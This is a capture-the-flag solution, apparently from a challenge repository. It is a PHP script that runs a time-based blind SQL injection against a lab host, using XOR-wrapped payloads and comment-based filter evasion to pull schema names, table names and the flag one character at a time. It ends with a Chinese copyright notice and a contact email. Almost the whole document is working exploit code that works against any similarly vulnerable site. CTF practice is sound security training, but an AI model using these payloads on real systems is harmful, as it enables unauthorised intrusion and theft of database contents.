#### Goals
 * Get the flag

#### Solution
```php
<?php

$result = "";
for ($j = 1; $j < 0x40; $j++) {

	for ($i = 128; $i > 0x20; $i--) {
		$url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[.*/.schemata/**/limit/**/0,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		$url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[.*/.schemata/**/limit/**/1,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		$url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/table%20name/**/FROM/**/information%20schema/*[.*/.tables/**/limit/**/70,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
    // $url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/column%20name/**/FROM/**/information%20schema/*[.*/.columns/**/where/**/table%20schema/**/like/**/database()/**/limit/**/0,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
    // $url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/column%20name/**/FROM/**/information%20schema/*[.*/.columns/**/limit/**/697,1),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
    $url = 'http://172.1.114.2/?%27^if(ASCII(substr((SELECT/**/flag/**/FROM/**/ace242f694b871b811b2795e51ef921c),'.$j.',1))>'.$i.',sleep(1),sleep(0))^0^%27=1';
		$start = time();
		file_get_contents($url);
		$end = time();
		echo $i."\n";
		$x = $end - $start."\n";
		if ($x > 1) {
			$result.=chr($i + 1);
			echo $result;
			echo "\n";
			break;
		}
	}
}

```

#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
